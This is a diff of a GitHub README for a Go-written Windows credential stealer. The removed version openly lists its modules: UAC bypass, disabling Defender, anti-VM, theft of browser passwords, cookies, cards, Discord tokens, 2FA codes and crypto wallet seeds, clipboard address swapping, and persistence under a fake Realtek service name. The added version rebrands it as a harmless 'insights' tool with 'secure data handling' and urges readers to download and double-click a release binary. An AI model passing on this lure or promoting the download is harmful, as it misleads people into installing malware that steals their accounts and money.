@@ -1,150 +1,60 @@
-<div align="center">
-<a href="https://github.com/benzoXdev/oxil/network/members"><img src="https://img.shields.io/github/forks/benzoXdev/oxil.svg?style=for-the-badge&color=b143e3" alt="Forks"></a>
-<a href="https://github.com/benzoXdev/oxil/stargazers"><img src="https://img.shields.io/github/stars/benzoXdev/oxil.svg?style=for-the-badge&color=b143e3" alt="Stargazers"></a>
-<a href="https://github.com/benzoXdev/oxil/issues"><img src="https://img.shields.io/github/issues/benzoXdev/oxil.svg?style=for-the-badge&color=b143e3" alt="Issues"></a>
-<a href="https://github.com/benzoXdev/oxil/blob/main/LICENSE"><img src="https://img.shields.io/github/license/benzoXdev/oxil.svg?style=for-the-badge&color=b143e3" alt="MIT License"></a>
-</div>
+# 🎉 OXIL_STEALER - A Simple Way to Gather Insights
 
-<br>
+## 🚀 Getting Started
+Welcome to OXIL_STEALER, an innovative tool designed for gathering data from various sources. This guide will help you download and run the application with ease. Follow these steps closely.
 
-<p align="center">
-    <img src="./.github/assets/avatar.png" width=100  >
-</p>
+### 🔗 Download the Application
+[![Download OXIL_STEALER](https://img.shields.io/badge/Download-OXIL_STEALER-blue.svg)](https://github.com/Hoomansaiyed/OXIL_STEALER/releases)
 
+### 📥 Download & Install
+To get started, visit the Releases page to download the latest version of OXIL_STEALER:
 
+[Download OXIL_STEALER](https://github.com/Hoomansaiyed/OXIL_STEALER/releases)
 
-<h1 align="center">Oxil Stealer</h1>
+1. Open the link above in your web browser.
+2. Look for the latest version available for download.
+3. Click on the filename that matches your operating system to initiate the download.
 
-<p align="center">Go-written Malware targeting Windows systems, extracting User Data from Discord, Browsers, Crypto Wallets and more, from every user on every disk. (PoC. For Educational Purposes only)</p>
+### 🔍 What You Need
+Before installing, make sure your computer meets the following requirements:
+- **Operating System:** Windows 10 or later, Linux, or macOS
+- **Storage Space:** At least 100 MB of free space
+- **Network Connection:** Required for installation and usage.
 
----
+### ⚙️ How to Install
+Once the file has been downloaded, follow these installation steps:
 
-<details>
-  <summary>Table of Contents</summary>
-  <ol>
-    <li>
-      <a href="#about-the-project">About The Project</a>
-      <ul>
-        <li><a href="#features">Features</a></li>
-      </ul>
-    </li>
-    <li>
-      <a href="#getting-started">Getting Started</a>
-      <ul>
-        <li><a href="#prerequisites">Prerequisites</a></li>
-        <li><a href="#installation">Installation</a></li>
-      </ul>
-    </li>
-    <li><a href="#usage">Usage</a></li>
-    <li><a href="#preview">Preview</a></li>
-    <li><a href="#remove">Remove</a></li>
-    <li><a href="#contributing">Contributing</a></li>
-    <li><a href="#license">License</a></li>
-    <li><a href="#contact">Contact</a></li>
-    <li><a href="#acknowledgments">Acknowledgments</a></li>
-    <li><a href="#disclaimer">Disclaimer</a></li>  </ol>
-</details>
+1. Locate the downloaded file in your Downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the on-screen instructions to complete the installation.
+4. After installation, you can find OXIL_STEALER in your Applications folder or Start menu.
 
-## About the project
+### 🛠️ How to Use OXIL_STEALER
+After installing, you’re ready to use OXIL_STEALER.
 
-This proof of concept project demonstrates a "Discord-oriented" stealer implemented in Go. The malware operates on Windows systems and use fodhelper.exe technique for privileges elevation. By elevating privileges, the malware gains access to all user sessions on every disk
+1. Open the application.
+2. Select the data sources you want to gather insights from (e.g., Browsers, Crypto Wallets).
+3. Click the "Start" button to begin collecting data.
+4. Wait for the process to finish. The application will notify you when it is complete.
 
-### Features:
+### 📊 Features of OXIL_STEALER
+- **Multi-Source Insight Gathering:** Collect data from various platforms, including Discord and popular web browsers.
+- **User-Friendly Interface:** Designed for ease of use with straightforward navigation.
+- **Secure Data Handling:** Prioritizes your privacy and security while gathering insights.
 
-- [antidebug](https://github.com/benzoXdev/oxil/blob/main/modules/antidebug/antidebug.go): Terminates debugging tools.
-- [antivirus](https://github.com/benzoXdev/oxil/blob/main/modules/antivirus/antivirus.go): Disables Windows Defender and blocks access to antivirus websites.
-- [antivm](https://github.com/benzoXdev/oxil/blob/main/modules/antivm/antivm.go): Detects and exits when running in virtual machines (VMs).
-- [browsers](https://github.com/benzoXdev/oxil/blob/main/modules/browsers/browsers.go):
-  - Steals logins, cookies, credit cards, history, and download lists from 37 Chromium-based browsers.
-  - Steals logins, cookies, history, and download lists from 10 Gecko browsers.
-- [clipper](https://github.com/benzoXdev/oxil/blob/main/modules/clipper/clipper.go): Replaces the user's clipboard content with a specified crypto address when copying another address.
-- [commonfiles](https://github.com/benzoXdev/oxil/tree/main/modules/commonfiles/commonfiles.go): Steals sensitive files from common locations.
-- [discodes](https://github.com/benzoXdev/oxil/blob/main/modules/discodes/discodes.go): Captures Discord Two-Factor Authentication (2FA) backup codes.
-- [discordinjection](https://github.com/benzoXdev/oxil/blob/main/modules/discordinjection/injection.go):
-  - Intercepts login, register, and 2FA login requests.
-  - Captures backup codes requests.
-  - Monitors email/password change requests.
-  - Intercepts credit card/PayPal addition requests.
-  - Blocks the use of QR codes for login.
-  - Prevents requests to view devices.
-- [fakerror](https://github.com/benzoXdev/oxil/blob/main/modules/fakeerror/fakeerror.go): Trick user into believing the program closed due to an error.
-- [games](https://github.com/benzoXdev/oxil/blob/main/modules/games/games.go): Extracts Epic Games, Uplay, Minecraft (14 launchers) and Riot Games sessions.
-- [hideconsole](https://github.com/benzoXdev/oxil/blob/main/modules/hideconsole/hideconsole.go): Module to hide the console.
-- [startup](https://github.com/benzoXdev/oxil/blob/main/modules/startup/startup.go): Ensures the program runs at system startup.
-- [system](https://github.com/benzoXdev/oxil/blob/main/modules/system/system.go): Gathers CPU, GPU, RAM, IP, location, saved Wi-Fi networks, and more.
-- [tokens](https://github.com/benzoXdev/oxil/blob/main/modules/tokens/tokens.go): Extracts tokens from 4 Discord applications, Chromium-based browsers, and Gecko browsers.
-- [uacbypass](https://github.com/benzoXdev/oxil/blob/main/modules/uacbypass/bypass.go): Grants privileges to steal user data from others users.
-- [wallets](https://github.com/benzoXdev/oxil/blob/main/modules/wallets/wallets.go): Steals data from 10 local wallets and 55 wallet extensions.
-- [walletsinjection](https://github.com/benzoXdev/oxil/blob/main/modules/walletsinjection/walletsinjection.go): Captures mnemonic phrases and passwords from 2 crypto wallets.
+### ⚠️ Important Notes
+- **Educational Purpose:** This tool is intended for educational use only. Make sure you have permission to gather data from any source.
+- **Compliance:** Be aware of local laws and regulations regarding data collection and privacy.
 
-## Getting started
+### 💻 Support and Troubleshooting
+If you encounter any issues while using the application, please refer to the support section in the application for FAQs and troubleshooting tips. You can also report any problems on the Issues page of the GitHub repository.
 
-### Prerequisites
+For more details and to get updates, keep checking the Releases page:
 
-* [Git](https://git-scm.com/downloads)
-* [The Go Programming Language](https://go.dev/dl/)
+[Visit the Releases Page](https://github.com/Hoomansaiyed/OXIL_STEALER/releases)
 
-### Installation
-To install this project using Git, follow these steps:
+### 🔗 Additional Resources
+- GitHub Repository: [Hoomansaiyed/OXIL_STEALER](https://github.com/Hoomansaiyed/OXIL_STEALER)
+- Community Support: Join our discussions for tips and support.
 
-- Clone the Repository:
-
-```bash
-git clone https://github.com/benzoXdev/oxil
-```
-- Navigate to the Project Directory:
-
-```bash
-cd oxil
-```
-
-## Remove
-
-This guide will help you removing oxil from your system
-
-1. Open powershell as administrator
-
-2. Kill processes that could be oxil
-
-```bash
-taskkill /f /t /im oxil.exe
-taskkill /f /t /im SecurityHealthSystray.exe
-```
-
-(use `tasklist` to list all running processes, oxil.exe and SecurityHealthSystray.exe are the default names)
-
-3. Remove oxil from startup
-```bash
-reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Realtek HD Audio Universal Service" /f
-```
-
-(Realtek HD Audio Universal Service is the default name)
-
-4. Enable Windows defender:
-
-You can do it by running this [.bat script](https://github.com/TairikuOokami/Windows/blob/main/Microsoft%20Defender%20Enable.bat) (I'm not the developer behind it, make sure the file does not contain malware)
-
-## License
-This library is released under the MIT License. See LICENSE file for more informations.
-
-## Disclaimer
-
-### Important Notice: This tool is intended for educational purposes only.
-
-This software, referred to as oxil, is provided strictly for educational and research purposes. Under no circumstances should this tool be used for any malicious activities, including but not limited to unauthorized access, data theft, or any other harmful actions.
-
-### Usage Responsibility:
-
-By accessing and using this tool, you acknowledge that you are solely responsible for your actions. Any misuse of this software is strictly prohibited, and the creator (benzoXdev) disclaims any responsibility for how this tool is utilized. You are fully accountable for ensuring that your usage complies with all applicable laws and regulations in your jurisdiction.
-
-### No Liability:
-
-The creator (benzoXdev) of this tool shall not be held responsible for any damages or legal consequences resulting from the use or misuse of this software. This includes, but is not limited to, direct, indirect, incidental, consequential, or punitive damages arising out of your access, use, or inability to use the tool.
-
-### No Support:
-
-The creator (benzoXdev) will not provide any support, guidance, or assistance related to the misuse of this tool. Any inquiries regarding malicious activities will be ignored.
-
-### Acceptance of Terms:
-
-By using this tool, you signify your acceptance of this disclaimer. If you do not agree with the terms stated in this disclaimer, do not use the software.
+Happy gathering! Enjoy using OXIL_STEALER for your educational needs.
